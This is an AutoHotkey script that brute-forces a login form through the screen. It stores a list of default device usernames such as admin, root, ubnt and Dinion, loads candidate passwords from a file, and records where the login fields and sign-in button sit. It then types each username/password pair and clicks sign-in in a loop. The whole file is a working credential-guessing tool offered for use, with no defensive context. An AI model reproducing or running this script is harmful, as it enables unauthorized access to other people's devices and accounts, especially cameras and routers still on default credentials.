#SingleInstance Force
SetTitleMatchMode, 2
CoordMode, Mouse, Screen
SetKeyDelay, 0, 0  ; Fastest typing

running := false

loginWords := ["admin", "admin1", "Admin", "Administrator", "root", "service", "Dinion", "888888", "666666", "ADMIN", "supervisor", "ubnt"]

; Load passwords from external file
passwordWords := []
Loop, Read, passwords.txt
{
    passwordWords.Push(A_LoopReadLine)
}

Gui, +AlwaysOnTop +ToolWindow
Gui, Font, s10
Gui, Add, Text,, 🚫 NO WORDS IN TEXT BOX BEFORE RUNNING SCRIPT
Gui, Font, s9
Gui, Add, Text,, 🔐 AutoHotkey Login Script Controls:
Gui, Add, Text,, ▸ Ctrl + Shift + L → Set Login Box Position
Gui, Add, Text,, ▸ Ctrl + Shift + O → Set Password Box Position
Gui, Add, Text,, ▸ Ctrl + Shift + P → Set Sign In Button Position
Gui, Add, Text,, ▸ Ctrl + Shift + T → Start Login Attempt Loop
Gui, Add, Text,, ▸ Esc → Stop Typing (Script stays open)
Gui, Add, Button, x10 y+20 w120 gResetLoop, 🔁 Reset Script
Gui, Show,, Login Script Controls
return

^+l::
    MsgBox, Hover over the LOGIN textbox, then press OK.
    MouseGetPos, lx, ly
    FileDelete, loginpos.txt
    FileAppend, %lx%`n%ly%, loginpos.txt
    MsgBox, Login textbox position saved: %lx%, %ly%
return

^+o::
    MsgBox, Hover over the PASSWORD textbox, then press OK.
    MouseGetPos, px, py
    FileDelete, passpos.txt
    FileAppend, %px%`n%py%, passpos.txt
    MsgBox, Password textbox position saved: %px%, %py%
return

^+p::
    MsgBox, Hover over the SIGN IN button, then press OK.
    MouseGetPos, sx, sy
    FileDelete, signinpos.txt
    FileAppend, %sx%`n%sy%, signinpos.txt
    MsgBox, Sign In button position saved: %sx%, %sy%
return

Esc::
    running := false
    ToolTip
return

ResetLoop:
    if (running) {
        MsgBox, Script is still running. Wait for it to finish or press Esc to stop.
        return
    }
    GoSub, RunLoginLoop
return

^+t::
    GoSub, RunLoginLoop
return

RunLoginLoop:
    if (running)
        return
    running := true

    if !FileExist("loginpos.txt") || !FileExist("passpos.txt") || !FileExist("signinpos.txt") {
        MsgBox, Please set all positions first using Ctrl+Shift+L, O, P.
        running := false
        return
    }

    FileReadLine, loginX, loginpos.txt, 1
    FileReadLine, loginY, loginpos.txt, 2
    FileReadLine, passX, passpos.txt, 1
    FileReadLine, passY, passpos.txt, 2
    FileReadLine, signinX, signinpos.txt, 1
    FileReadLine, signinY, signinpos.txt, 2

    MsgBox, Confirmed Positions:`nLogin: %loginX%, %loginY%`nPass: %passX%, %passY%`nSign In: %signinX%, %signinY%

    Loop, % loginWords.MaxIndex() {
        login := loginWords[A_Index]
        MouseMove, loginX, loginY
        Click
        Sleep, 50
        SendInput, %login%
        Sleep, 50

        Loop, % passwordWords.MaxIndex() {
            if (!running)
                break

            pass := passwordWords[A_Index]
            ToolTip, Typing:`n%login% / %pass%
            MouseMove, passX, passY
            Click
            Sleep, 50
            SendInput, %pass%
            Sleep, 50

            MouseMove, signinX, signinY
            Click
            Sleep, 300

            ; Clear password
            MouseMove, passX, passY
            Click
            Sleep, 30
            Send, ^a
            Sleep, 30
            Send, {Backspace}
            Sleep, 60
        }

        if (!running)
            break

        ; Clear login field
        MouseMove, loginX, loginY
        Click
        Sleep, 30
        Send, ^a
        Sleep, 30
        Send, {Backspace}
        Sleep, 60
    }

    ToolTip
    MsgBox, Login/Password combinations complete.
    running := false
return
